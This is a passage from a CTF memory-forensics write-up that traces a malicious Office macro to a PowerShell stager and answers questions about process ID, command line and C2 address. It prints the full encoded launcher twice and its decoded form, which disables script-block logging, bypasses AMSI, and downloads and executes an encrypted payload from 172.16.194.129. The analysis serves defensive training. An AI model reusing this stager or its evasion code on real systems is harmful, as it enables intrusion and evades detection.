+        Set objProcess = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2:Win32_Process&quot;)
+        objProcess.Create yQf, Null, objConfig, intProcessID
+End Function
+</code></pre><p>As we can see from the output, the macro starts WMI and executes the PowerShell paylaod there.</p>
+<p>This means the suspicious WMI service is oujr answer as we suspected in the first place. The answer is 3416.</p>
+<h2 id=powers-hell>Powers Hell</h2>
+<blockquote>
+<p>Q: Some suspicious powershell was executed. What was the executed command (starting with powershell -flag1 -flag2 etc&mldr;)</p>
+</blockquote>
+<p>We already extracted the PowerShell from the file with oletools. To convert it to form required by the question, we can just calculate it by pasting it to file and adding print(yQf) at the end and running it with python:</p>
+<pre tabindex=0><code>~$ python3 powershell.txt
+powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAFIAUwBpAG8AbgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAUwBJAE8ATgAuAE0AYQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJAAxADEAQgBEADgAPQBbAFIARQBGAF0ALgBBAHMAUwBlAE0AQgBsAFkALgBHAEUAdABUAHkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBlAFQARgBpAEUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQAMQAxAGIARAA4ACkAewAkAGEAMQA4AGUAMQA9ACQAMQAxAGIAZAA4AC4ARwBlAFQAVgBBAGwAVQBFACgAJABuAHUAbABMACkAOwBJAGYAKAAkAGEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkAEEAMQA4AEUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABBADEAOABlADEAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJABWAGEAbAA9AFsAQwBPAEwATABlAEMAdABpAG8ATgBzAC4ARwBlAG4AZQByAEkAYwAuAEQAaQBDAFQAaQBPAG4AQQByAFkAWwBzAHQAUgBpAG4AZwAsAFMAeQBzAHQARQBNAC4ATwBCAGoAZQBDAHQAXQBdADoAOgBuAEUAdwAoACkAOwAkAFYAQQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAYQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAQQAxADgARQAxAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAHYAYQBMAH0ARQBMAHMARQB7AFsAUwBjAHIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcARQB0AEYASQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbAB1AEUAKAAkAE4AdQBMAGwALAAoAE4AZQB3AC0ATwBiAEoARQBDAFQAIABDAG8AbABsAGUAQwBUAGkATwBuAHMALgBHAEUAbgBFAHIASQBjAC4ASABhAHMASABTAGUAVABbAHMAdABSAEkATgBnAF0AKQApAH0AJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAUwBzAGUAbQBCAGwAWQAuAEcAZQB0AFQAWQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBFAHQARgBpAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEATABVAEUAKAAkAE4AdQBMAEwALAAkAHQAUgBVAEUAKQA7AH0AOwBbAFMAWQBzAHQAZQBtAC4ATgBFAHQALgBTAGUAUgB2AGkAQwBFAFAATwBJAG4AVABNAGEATgBBAGcARQBSAF0AOgA6AEUAWABwAEUAYwB0ADEAMAAwAEMAbwBuAHQASQBOAFUARQA9ADAAOwAkADcAYQA2AEUARAA9AE4ARQB3AC0ATwBiAGoARQBjAFQAIABTAHkAcwB0AGUATQAuAE4AZQBUAC4AVwBlAEIAQwBsAGkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAA3AEEANgBFAGQALgBIAEUAYQBEAEUAUgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA3AEEANgBlAEQALgBQAFIAbwBYAFkAPQBbAFMAeQBzAHQARQBtAC4ATgBFAHQALgBXAEUAYgBSAGUAcQBVAGUAUwB0AF0AOgA6AEQARQBGAGEAVQBsAFQAVwBlAEIAUABSAG8AWABZADsAJAA3AGEANgBFAEQALgBQAHIATwB4AHkALgBDAHIARQBkAEUAbgBUAEkAQQBsAFMAIAA9ACAAWwBTAHkAcwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AdABpAGEATABDAGEAYwBoAGUAXQA6ADoARABlAGYAQQBVAGwAVABOAEUAdABXAE8AUgBLAEMAcgBlAGQARQBuAFQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA3AGEANgBlAGQALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBNAC4AVABFAFgAdAAuAEUAbgBDAG8AZABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAFkAdABlAFMAKAAnADMANQA4ADgAZQA1AGIAOQA4AGIAMQAwADUAMQBlAGUANgBkAGMANwA3ADQAOABmADEAMwA0ADcANAA5ADgANwAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAFgAdAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBVAG4AaQBjAE8AZABlAC4ARwBlAFQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAFYARQByAFQAXQA6ADoARgByAE8AbQBCAGEAUwBFADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABjAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBAHUAQQBEAEUAQQBPAFEAQQAwAEEAQwA0AEEATQBRAEEAeQBBAEQAawBBAE8AZwBBADQAQQBEAEEAQQAnACkAKQApADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQANwBBADYARQBEAC4ASABlAEEAZABlAFIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBUAEQAYQBNAE4ARABOAD0AagBZAEoASAB5AGcAdgBZAFYASwB5AHEAZQBJAEIAZAB1AHoASwBVADIAbgBEAFQASAB5AGMAPQAiACkAOwAkAGQAQQB0AEEAPQAkADcAYQA2AGUARAAuAEQATwBXAG4ATABPAGEAZABEAGEAVABhACgAJABzAGUAcgArACQAdAApADsAJABpAFYAPQAkAEQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAEQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAEQAQQB0AEEALgBMAGUAbgBHAHQAaABdADsALQBqAE8AaQBOAFsAQwBIAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
+</code></pre><p>Other, not so professional way, could be by dumping the process memory and grepping it out of the file:</p>
+<pre tabindex=0><code>~$ vol.py -f finalboss.mem --profile=Win10x64_17763 memdump -p 3908 -D memdump   
+Volatility Foundation Volatility Framework 2.6.1
+************************************************************************
+Writing powershell.exe [  3908] to 3908.dmp
+~$ strings 3908.dmp|grep powershell|head -n1
+powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAFIAUwBpAG8AbgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAUwBJAE8ATgAuAE0AYQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJAAxADEAQgBEADgAPQBbAFIARQBGAF0ALgBBAHMAUwBlAE0AQgBsAFkALgBHAEUAdABUAHkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBlAFQARgBpAEUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQAMQAxAGIARAA4ACkAewAkAGEAMQA4AGUAMQA9ACQAMQAxAGIAZAA4AC4ARwBlAFQAVgBBAGwAVQBFACgAJABuAHUAbABMACkAOwBJAGYAKAAkAGEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkAEEAMQA4AEUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABBADEAOABlADEAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJABWAGEAbAA9AFsAQwBPAEwATABlAEMAdABpAG8ATgBzAC4ARwBlAG4AZQByAEkAYwAuAEQAaQBDAFQAaQBPAG4AQQByAFkAWwBzAHQAUgBpAG4AZwAsAFMAeQBzAHQARQBNAC4ATwBCAGoAZQBDAHQAXQBdADoAOgBuAEUAdwAoACkAOwAkAFYAQQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAYQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAQQAxADgARQAxAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAHYAYQBMAH0ARQBMAHMARQB7AFsAUwBjAHIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcARQB0AEYASQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbAB1AEUAKAAkAE4AdQBMAGwALAAoAE4AZQB3AC0ATwBiAEoARQBDAFQAIABDAG8AbABsAGUAQwBUAGkATwBuAHMALgBHAEUAbgBFAHIASQBjAC4ASABhAHMASABTAGUAVABbAHMAdABSAEkATgBnAF0AKQApAH0AJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAUwBzAGUAbQBCAGwAWQAuAEcAZQB0AFQAWQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBFAHQARgBpAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEATABVAEUAKAAkAE4AdQBMAEwALAAkAHQAUgBVAEUAKQA7AH0AOwBbAFMAWQBzAHQAZQBtAC4ATgBFAHQALgBTAGUAUgB2AGkAQwBFAFAATwBJAG4AVABNAGEATgBBAGcARQBSAF0AOgA6AEUAWABwAEUAYwB0ADEAMAAwAEMAbwBuAHQASQBOAFUARQA9ADAAOwAkADcAYQA2AEUARAA9AE4ARQB3AC0ATwBiAGoARQBjAFQAIABTAHkAcwB0AGUATQAuAE4AZQBUAC4AVwBlAEIAQwBsAGkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAA3AEEANgBFAGQALgBIAEUAYQBEAEUAUgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA3AEEANgBlAEQALgBQAFIAbwBYAFkAPQBbAFMAeQBzAHQARQBtAC4ATgBFAHQALgBXAEUAYgBSAGUAcQBVAGUAUwB0AF0AOgA6AEQARQBGAGEAVQBsAFQAVwBlAEIAUABSAG8AWABZADsAJAA3AGEANgBFAEQALgBQAHIATwB4AHkALgBDAHIARQBkAEUAbgBUAEkAQQBsAFMAIAA9ACAAWwBTAHkAcwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AdABpAGEATABDAGEAYwBoAGUAXQA6ADoARABlAGYAQQBVAGwAVABOAEUAdABXAE8AUgBLAEMAcgBlAGQARQBuAFQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA3AGEANgBlAGQALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBNAC4AVABFAFgAdAAuAEUAbgBDAG8AZABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAFkAdABlAFMAKAAnADMANQA4ADgAZQA1AGIAOQA4AGIAMQAwADUAMQBlAGUANgBkAGMANwA3ADQAOABmADEAMwA0ADcANAA5ADgANwAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAFgAdAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBVAG4AaQBjAE8AZABlAC4ARwBlAFQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAFYARQByAFQAXQA6ADoARgByAE8AbQBCAGEAUwBFADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABjAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBAHUAQQBEAEUAQQBPAFEAQQAwAEEAQwA0AEEATQBRAEEAeQBBAEQAawBBAE8AZwBBADQAQQBEAEEAQQAnACkAKQApADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQANwBBADYARQBEAC4ASABlAEEAZABlAFIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBUAEQAYQBNAE4ARABOAD0AagBZAEoASAB5AGcAdgBZAFYASwB5AHEAZQBJAEIAZAB1AHoASwBVADIAbgBEAFQASAB5AGMAPQAiACkAOwAkAGQAQQB0AEEAPQAkADcAYQA2AGUARAAuAEQATwBXAG4ATABPAGEAZABEAGEAVABhACgAJABzAGUAcgArACQAdAApADsAJABpAFYAPQAkAEQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAEQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAEQAQQB0AEEALgBMAGUAbgBHAHQAaABdADsALQBqAE8AaQBOAFsAQwBIAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
+</code></pre><h2 id=c2>C2</h2>
+<blockquote>
+<p>Q: There&rsquo;s a malware calling &ldquo;home&rdquo;. What is the C2 IP address of the malware?</p>
+</blockquote>
+<p>Once again, many ways to do it. I prefer decoding the PowerShell payload:</p>
+<pre tabindex=0><code>~$ cat payload.b64|base64 -d
+If($PSVeRSionTABLE.PSVeRSION.MaJoR -GE 3){$11BD8=[REF].AsSeMBlY.GEtTyPE('System.Management.Automation.Utils').&quot;GeTFiE`Ld&quot;('cachedGroupPolicySettings','N'+'onPublic,Static');If($11bD8){$a18e1=$11bd8.GeTVAlUE($nulL);If($a18e1['ScriptB'+'lockLogging']){$A18E1['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$A18e1['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$Val=[COLLeCtioNs.GenerIc.DiCTiOnArY[stRing,SystEM.OBjeCt]]::nEw();$VAl.Add('EnableScriptB'+'lockLogging',0);$Val.Add('EnableScriptBlockInvocationLogging',0);$A18E1['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$vaL}ELsE{[ScrIptBlOcK].&quot;GEtFIe`Ld&quot;('signatures','N'+'onPublic,Static').SEtVAluE($NuLl,(New-ObJECT ColleCTiOns.GEnErIc.HasHSeT[stRINg]))}$Ref=[Ref].ASsemBlY.GetTYPe('System.Management.Automation.Amsi'+'Utils');$Ref.GEtFieLD('amsiInitF'+'ailed','NonPublic,Static').SetVaLUE($NuLL,$tRUE);};[SYstem.NEt.SeRviCEPOInTMaNAgER]::EXpEct100ContINUE=0;$7a6ED=NEw-ObjEcT SysteM.NeT.WeBCliEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$7A6Ed.HEaDERS.Add('User-Agent',$u);$7A6eD.PRoXY=[SystEm.NEt.WEbReqUeSt]::DEFaUlTWeBPRoXY;$7a6ED.PrOxy.CrEdEnTIAlS = [SysTeM.NET.CreDEntiaLCache]::DefAUlTNEtWORKCredEnTials;$Script:Proxy = $7a6ed.Proxy;$K=[SysTEM.TEXt.EnCodinG]::ASCII.GetBYteS('3588e5b98b1051ee6dc7748f13474987');$R={$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXoR$S[($S[$I]+$S[$H])%256]}};$ser=$([TeXt.EnCoDiNG]::UnicOde.GeTString([ConVErT]::FrOmBaSE64STRing('aAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOQA0AC4AMQAyADkAOgA4ADAA')));$t='/admin/get.php';$7A6ED.HeAdeRs.ADD(&quot;Cookie&quot;,&quot;TDaMNDN=jYJHygvYVKyqeIBduzKU2nDTHyc=&quot;);$dAtA=$7a6eD.DOWnLOadDaTa($ser+$t);$iV=$Data[0..3];$Data=$data[4..$DAtA.LenGth];-jOiN[CHar[]](&amp; $R $DAta ($IV+$K))|IEX
+</code></pre><p>Kinda ugly output, let&rsquo;s beautify it:</p>
+<pre tabindex=0><code>If($PSVeRSionTABLE.PSVeRSION.MaJoR - GE 3) {
+    $11BD8 = [REF].AsSeMBlY.GEtTyPE('System.Management.Automation.Utils').
+    &quot;GeTFiE`Ld&quot;('cachedGroupPolicySettings', 'N' + 'onPublic,Static');
+    If($11bD8) {
+        $a18e1 = $11bd8.GeTVAlUE($nulL);
+        If($a18e1['ScriptB' + 'lockLogging']) {
+            $A18E1['ScriptB' + 'lockLogging']['EnableScriptB' + 'lockLogging'] = 0;
+            $A18e1['ScriptB' + 'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
+        }
+        $Val = [COLLeCtioNs.GenerIc.DiCTiOnArY[stRing, SystEM.OBjeCt]]::nEw();
+        $VAl.Add('EnableScriptB' + 'lockLogging', 0);
+        $Val.Add('EnableScriptBlockInvocationLogging', 0);
+        $A18E1['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB' + 'lockLogging'] = $vaL
+    }
+    ELsE {
+        [ScrIptBlOcK].
+        &quot;GEtFIe`Ld&quot;('signatures', 'N' + 'onPublic,Static').SEtVAluE($NuLl, (New - ObJECT ColleCTiOns.GEnErIc.HasHSeT[stRINg]))
+    }
+    $Ref = [Ref].ASsemBlY.GetTYPe('System.Management.Automation.Amsi' + 'Utils');
+    $Ref.GEtFieLD('amsiInitF' + 'ailed', 'NonPublic,Static').SetVaLUE($NuLL, $tRUE);
+};
+[SYstem.NEt.SeRviCEPOInTMaNAgER]::EXpEct100ContINUE = 0;
+$7a6ED = NEw - ObjEcT SysteM.NeT.WeBCliEnt;
+$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
+$7A6Ed.HEaDERS.Add('User-Agent', $u);
+$7A6eD.PRoXY = [SystEm.NEt.WEbReqUeSt]::DEFaUlTWeBPRoXY;
+$7a6ED.PrOxy.CrEdEnTIAlS = [SysTeM.NET.CreDEntiaLCache]::DefAUlTNEtWORKCredEnTials;
+$Script: Proxy = $7a6ed.Proxy;
+$K = [SysTEM.TEXt.EnCodinG]::ASCII.GetBYteS('3588e5b98b1051ee6dc7748f13474987');
+$R = {
+    $D,
+    $K = $ArgS;$S = 0. .255;0. .255 | % {
+        $J = ($J + $S[$_] + $K[$_ % $K.COuNT]) % 256;$S[$_],
+        $S[$J] = $S[$J],
+        $S[$_]
+    };$D | % {
+        $I = ($I + 1) % 256;$H = ($H + $S[$I]) % 256;$S[$I],
+        $S[$H] = $S[$H],
+        $S[$I];$_ - bXoR$S[($S[$I] + $S[$H]) % 256]
+    }
+};
+$ser = $([TeXt.EnCoDiNG]::UnicOde.GeTString([ConVErT]::FrOmBaSE64STRing('aAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOQA0AC4AMQAyADkAOgA4ADAA')));
+$t = '/admin/get.php';
+$7A6ED.HeAdeRs.ADD(&quot;Cookie&quot;, &quot;TDaMNDN=jYJHygvYVKyqeIBduzKU2nDTHyc=&quot;);
+$dAtA = $7a6eD.DOWnLOadDaTa($ser + $t);
+$iV = $Data[0. .3];
+$Data = $data[4..$DAtA.LenGth]; - jOiN[CHar[]]( &amp; $R $DAta($IV + $K)) | IEX
+</code></pre><p>Alright, we can see the HTTP request HOST-part being build here:</p>
+<pre tabindex=0><code>$ser = $([TeXt.EnCoDiNG]::UnicOde.GeTString([ConVErT]::FrOmBaSE64STRing('aAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOQA0AC4AMQAyADkAOgA4ADAA')));
+$t = '/admin/get.php';
+$7A6ED.HeAdeRs.ADD(&quot;Cookie&quot;, &quot;TDaMNDN=jYJHygvYVKyqeIBduzKU2nDTHyc=&quot;);
+$dAtA = $7a6eD.DOWnLOadDaTa($ser + $t);
+</code></pre><p>The full C2 URL:</p>
+<pre tabindex=0><code>http://172.16.194.129:80/admin/get.php
+</code></pre><p>We can also see the IP address in netscan output:</p>
+<pre tabindex=0><code>~$ cat netscan.txt|grep 172.16.194.129
+0x980f73f0fbe0     TCPv4    172.16.194.128:49977           172.16.194.129:80    CLOSED           -1    
+</code></pre><p>Strings also provide us the full requests send to C2 address:</p>
+<pre tabindex=0><code>~$ strings -a finalboss.mem &gt; Q: strings_ascii.txt
+~$ grep &quot;Host: 172.16.194.129&quot; -B3 -A1 strings_ascii.txt
+GET /login/process.php HTTP/1.1
+Cookie: session=5Advbi+/4r1L9BNUzLTNybtcy1k=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+--
+GET /admin/get.php HTTP/1.1
+Cookie: session=/PotPTX63p/C1HPgKpkcm+QRRWY=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+--
+GET /login/process.php HTTP/1.1
+Cookie: session=MmbeesIwk8I37sqq47aA2qA1LwA=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+--
+AfdB
+POST /admin/get.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Content-Length: 190
+--
+GET /login/process.php HTTP/1.1
+Cookie: session=PuGsY08kmiAsLNCDyUCZ1o1xC2E=
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host: 172.16.194.129
+Connection: Keep-Alive
+</code></pre><p>The answer: 172.16.194.129</p>
+<h2 id=stage-1>Stage #1</h2>
+<blockquote>
+<p>Q: The malware downloads stager from 172.16.194.129 the first time. What is the URI the malware connects to (for the first time)?</p>
+</blockquote>
+<p>We already found out the full URI in the previous assignment:</p>
+<pre tabindex=0><code>$ser = $([TeXt.EnCoDiNG]::UnicOde.GeTString([ConVErT]::FrOmBaSE64STRing('aAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOQA0AC4AMQAyADkAOgA4ADAA')));
+$t = '/admin/get.php';
+$7A6ED.HeAdeRs.ADD(&quot;Cookie&quot;, &quot;TDaMNDN=jYJHygvYVKyqeIBduzKU2nDTHyc=&quot;);
